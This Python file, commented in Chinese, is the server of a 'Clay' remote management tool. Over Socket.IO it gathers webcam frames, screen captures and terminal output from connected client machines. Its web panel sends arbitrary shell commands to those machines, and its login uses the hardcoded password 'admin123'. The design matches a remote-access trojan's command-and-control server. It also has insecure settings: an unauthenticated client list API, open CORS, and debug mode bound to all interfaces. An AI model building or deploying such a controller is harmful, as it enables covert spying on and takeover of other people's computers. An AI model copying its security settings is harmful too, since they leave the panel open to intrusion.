import time
import platform
import logging
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit, join_room, leave_room

# 配置日志 - 增强详细度便于调试
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('server.log'),  # 保存到文件
        logging.StreamHandler()  # 同时输出到控制台
    ]
)
logger = logging.getLogger(__name__)

# 初始化 Flask 应用和 SocketIO
async_mode = "eventlet"
app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_very_secret_key_here!'  # 生产环境建议使用环境变量
app.config['JSON_SORT_KEYS'] = False  # 保持JSON字段顺序
socketio = SocketIO(
    app,
    async_mode=async_mode,
    cors_allowed_origins="*",  # 开发环境允许跨域，生产环境需限制
    ping_timeout=30,
    ping_interval=10
)

# 存储连接的客户端信息 (增强数据结构)
connected_clients = {}
"""
客户端数据结构:
{
    client_id: {
        'id': client_id,
        'address': ip地址,
        'hostname': 主机名,
        'os': 操作系统,
        'last_seen': 最后活动时间戳,
        'connected_at': 连接时间,
        'screen_active': 是否正在传输屏幕,
        'webcam_active': 是否正在传输摄像头,
        'last_screen': 最后一次屏幕传输时间
    }, ...
}
"""


def add_client(client_id, address):
    """添加新客户端"""
    connected_clients[client_id] = {
        'id': client_id,
        'address': address,
        'hostname': '未知',
        'os': '未知',
        'last_seen': time.time(),
        'connected_at': time.time(),
        'screen_active': False,
        'webcam_active': False,
        'last_screen': 0
    }
    logger.debug(f"客户端已添加: {client_id}")


def remove_client(client_id):
    """移除客户端"""
    if client_id in connected_clients:
        del connected_clients[client_id]
        logger.debug(f"客户端已移除: {client_id}")


def update_client_info(client_id, hostname, os_info):
    """更新客户端基本信息"""
    if client_id in connected_clients:
        connected_clients[client_id].update({
            'hostname': hostname,
            'os': os_info,
            'last_seen': time.time()
        })


def update_client_last_seen(client_id):
    """更新客户端最后活动时间"""
    if client_id in connected_clients:
        connected_clients[client_id]['last_seen'] = time.time()


def update_client_media_status(client_id, media_type, status):
    """更新客户端媒体传输状态"""
    if client_id in connected_clients:
        if media_type == 'screen':
            connected_clients[client_id]['screen_active'] = status
            if status:
                connected_clients[client_id]['last_screen'] = time.time()
        elif media_type == 'webcam':
            connected_clients[client_id]['webcam_active'] = status


def get_client(client_id):
    """获取客户端信息"""
    return connected_clients.get(client_id)


def get_all_clients():
    """获取所有客户端列表"""
    return list(connected_clients.values())


# --- Flask 应用初始化 ---

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_very_secret_key_here!'  # 生产环境使用环境变量
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 限制上传大小

# 密码配置 (生产环境使用环境变量)
PASSWORD = 'admin123'

# 初始化SocketIO
socketio = SocketIO(
    app,
    async_mode="eventlet",
    ping_timeout=60,
    ping_interval=10,
    max_http_buffer_size=16 * 1024 * 1024  # 支持大尺寸图像传输
)


# --- Flask 路由 ---

@app.route('/', methods=['GET', 'POST'])
def index():
    """管理后台登录与主页"""
    if request.method == 'POST':
        password = request.form.get('password')
        if password == PASSWORD:
            return render_template('index.html')
        else:
            return render_template('login.html', error='密码错误')
    return render_template('login.html')


@app.route('/api/clients', methods=['GET'])
def api_get_clients():
    """API接口：获取客户端列表"""
    return jsonify({
        'success': True,
        'clients': get_all_clients()
    })


# --- SocketIO 事件处理 ---

@socketio.on('connect')
def handle_connect():
    """处理新连接"""
    client_id = request.sid
    client_address = request.remote_addr
    client_type = request.headers.get('Client-Type')

    try:
        if client_type == 'clay-client':
            # 客户端连接
            logger.info(f"客户端连接: ID={client_id}, IP={client_address}")
            add_client(client_id, client_address)
            emit_client_list_update()
            # 发送服务器时间同步信息
            emit('server_time', {'timestamp': time.time()}, room=client_id)
        else:
            # Web管理端连接
            logger.info(f"Web界面连接: ID={client_id}, IP={client_address}")
            join_room('web_clients')
            # 立即发送当前客户端列表
            emit('update_client_list', get_all_clients())

    except Exception as e:
        logger.error(f"连接处理错误: {str(e)}")
        emit('connection_error', {'message': str(e)})


@socketio.on('disconnect')
def handle_disconnect():
    """处理断开连接"""
    client_id = request.sid
    client = get_client(client_id)

    try:
        if client:
            logger.info(f"客户端断开连接: ID={client_id}, 主机名={client.get('hostname', '未知')}")
            remove_client(client_id)
            emit_client_list_update()
        else:
            logger.warning(f"未知客户端断开连接: ID={client_id}")

    except Exception as e:
        logger.error(f"断开连接处理错误: {str(e)}")


@socketio.on('register')
def handle_register(data):
    """处理客户端注册信息"""
    client_id = request.sid

    try:
        if client_id not in connected_clients:
            logger.warning(f"无效注册尝试: 客户端 {client_id} 不在连接列表中")
            emit('registration_failed', {'message': '无效的客户端连接'})
            return

        # 提取并更新客户端信息
        hostname = data.get('hostname', '未知')
        os_info = data.get('os', '未知')
        update_client_info(client_id, hostname, os_info)

        logger.info(f"客户端注册完成: ID={client_id}, 主机名={hostname}, 操作系统={os_info}")
        emit_client_list_update()
        # 注册成功确认
        emit('registration_success', {'message': '注册成功'})

    except Exception as e:
        logger.error(f"注册处理错误: {str(e)}")
        emit('registration_failed', {'message': str(e)})


@socketio.on('heartbeat')
def handle_heartbeat(data):
    """处理客户端心跳"""
    client_id = request.sid

    try:
        if client_id in connected_clients:
            update_client_last_seen(client_id)
            # 定期回应心跳，确认连接有效性
            if time.time() % 5 < 1:  # 每5秒左右回应一次
                emit('heartbeat_ack', {'timestamp': time.time()})
        else:
            logger.warning(f"未知客户端心跳: ID={client_id}, 请求重新注册")
            emit('request_register', {'reason': '客户端未注册'})

    except Exception as e:
        logger.error(f"心跳处理错误: {str(e)}")


@socketio.on('terminal_output')
def handle_terminal_output(data):
    """处理终端输出并转发"""
    client_id = request.sid
    output = data.get('output', '')

    try:
        if not output:
            logger.warning(f"空终端输出来自 {client_id}")
            return

        logger.info(f"终端输出来自 {client_id}: {output.strip()[:100]}...")  # 限制日志长度

        # 转发给所有Web客户端
        emit('terminal_output', {
            'client_id': client_id,
            'output': output,
            'timestamp': time.time()
        }, room='web_clients')

    except Exception as e:
        logger.error(f"终端输出处理错误: {str(e)}")


@socketio.on('webcam_frame')
def handle_webcam_frame(data):
    """处理摄像头帧数据并转发"""
    client_id = request.sid
    image_data = data.get('image_data', '')

    try:
        if not image_data:
            logger.warning(f"空摄像头数据来自 {client_id}")
            return

        # 更新客户端媒体状态
        update_client_media_status(client_id, 'webcam', True)

        # 记录传输信息（限制日志长度）
        logger.info(f"摄像头数据来自 {client_id} (长度: {len(image_data)})")

        # 转发给Web客户端
        emit('webcam_frame', {
            'client_id': client_id,
            'image_data': image_data,
            'timestamp': data.get('timestamp', time.time())
        }, room='web_clients')

    except Exception as e:
        logger.error(f"摄像头数据处理错误: {str(e)}")
        update_client_media_status(client_id, 'webcam', False)


@socketio.on('screen_frame')
def handle_screen_frame(data):
    """处理屏幕截图帧数据并转发（新增核心功能）"""
    client_id = request.sid
    image_data = data.get('image_data', '')

    try:
        if not image_data:
            logger.warning(f"空屏幕数据来自 {client_id}")
            return

        # 更新客户端媒体状态
        update_client_media_status(client_id, 'screen', True)

        # 记录传输信息
        logger.info(f"屏幕数据来自 {client_id} (长度: {len(image_data)})")

        # 转发给Web客户端
        emit('screen_frame', {
            'client_id': client_id,
            'image_data': image_data,
            'timestamp': data.get('timestamp', time.time()),
            'width': data.get('width'),
            'height': data.get('height')
        }, room='web_clients')

    except Exception as e:
        logger.error(f"屏幕数据处理错误: {str(e)}")
        update_client_media_status(client_id, 'screen', False)


@socketio.on('command_result')
def handle_command_result(data):
    """处理命令执行结果"""
    client_id = request.sid
    command = data.get('command')
    success = data.get('success', False)
    message = data.get('message', '')

    try:
        logger.info(f"命令结果来自 {client_id} - 命令: {command}, 成功: {success}")

        # 转发命令结果
        emit('command_result', {
            'client_id': client_id,
            'command': command,
            'success': success,
            'message': message,
            'timestamp': time.time()
        }, room='web_clients')

    except Exception as e:
        logger.error(f"命令结果处理错误: {str(e)}")


@socketio.on('execute_command')
def handle_execute_command(data):
    """处理命令执行请求"""
    target_client_id = data.get('client_id')
    command = data.get('command')
    sender_id = request.sid  # 记录发送者ID

    try:
        if not target_client_id:
            error_msg = "未指定目标客户端ID"
            logger.error(f"命令执行错误: {error_msg} (发送者: {sender_id})")
            emit('command_error', {'message': error_msg})
            return

        client = get_client(target_client_id)
        if not client:
            error_msg = f"客户端 {target_client_id} 不存在或已断开"
            logger.error(f"命令执行错误: {error_msg} (发送者: {sender_id})")
            emit('command_error', {'message': error_msg})
            return

        logger.info(f"命令发送到 {target_client_id}: {command} (发送者: {sender_id})")

        # 发送命令到目标客户端
        emit('execute_command', {
            'command': command,
            'sender': sender_id
        }, room=target_client_id)

        # 确认命令已发送
        emit('command_sent', {
            'client_id': target_client_id,
            'command': command,
            'timestamp': time.time()
        })

    except Exception as e:
        logger.error(f"命令执行请求处理错误: {str(e)}")
        emit('command_error', {'message': str(e)})


@socketio.on('interrupt_command')
def handle_interrupt_command(data):
    """处理命令中断请求"""
    client_id = data.get('client_id')

    try:
        if not client_id:
            logger.error("未指定客户端ID的中断请求")
            return

        if not get_client(client_id):
            logger.error(f"中断请求失败: 客户端 {client_id} 不存在")
            return

        logger.info(f"向 {client_id} 发送命令中断请求")
        emit('interrupt_command', {}, room=client_id)

    except Exception as e:
        logger.error(f"命令中断处理错误: {str(e)}")


@socketio.on('get_clients')
def handle_get_clients():
    """处理客户端列表请求"""
    try:
        # 只发送给请求者
        emit('update_client_list', get_all_clients())
    except Exception as e:
        logger.error(f"客户端列表请求处理错误: {str(e)}")


# --- 辅助函数 ---

def emit_client_list_update():
    """广播客户端列表更新"""
    try:
        socketio.emit('update_client_list', get_all_clients(), room='web_clients')
        logger.debug("客户端列表已广播更新")
    except Exception as e:
        logger.error(f"客户端列表广播错误: {str(e)}")


def check_client_timeouts():
    """客户端超时检查后台任务"""
    logger.info("客户端超时检查任务已启动")
    while True:
        try:
            now = time.time()
            timeout_threshold = 60  # 60秒超时
            disconnected_ids = []

            # 检查所有客户端
            for client_id in list(connected_clients.keys()):
                client = get_client(client_id)
                if client:
                    # 检查超时
                    if now - client['last_seen'] > timeout_threshold:
                        # 检查是否有活跃的媒体传输
                        if client['screen_active'] or client['webcam_active']:
                            # 媒体传输中延长超时时间
                            if now - client['last_seen'] > timeout_threshold * 3:
                                disconnected_ids.append(client_id)
                        else:
                            disconnected_ids.append(client_id)

            # 处理超时客户端
            if disconnected_ids:
                for client_id in disconnected_ids:
                    client = get_client(client_id)
                    if client:
                        logger.warning(f"客户端超时断开: {client_id} ({client['hostname']})")
                        remove_client(client_id)

                # 通知更新
                emit_client_list_update()

        except Exception as e:
            logger.error(f"超时检查任务错误: {str(e)}")

        # 等待30秒再次检查
        socketio.sleep(30)


# --- 启动服务器 ---

if __name__ == '__main__':
    # 启动超时检查任务
    socketio.start_background_task(check_client_timeouts)

    logger.info("Clay 远程管理服务器启动中...")
    logger.info(f"系统信息: {platform.system()} {platform.release()}")

    try:
        # 启动服务器
        socketio.run(
            app,
            host='0.0.0.0',
            port=5000,
            debug=True,
            allow_unsafe_werkzeug=True  # 开发环境使用
        )
    except Exception as e:
        logger.critical(f"服务器启动失败: {str(e)}", exc_info=True)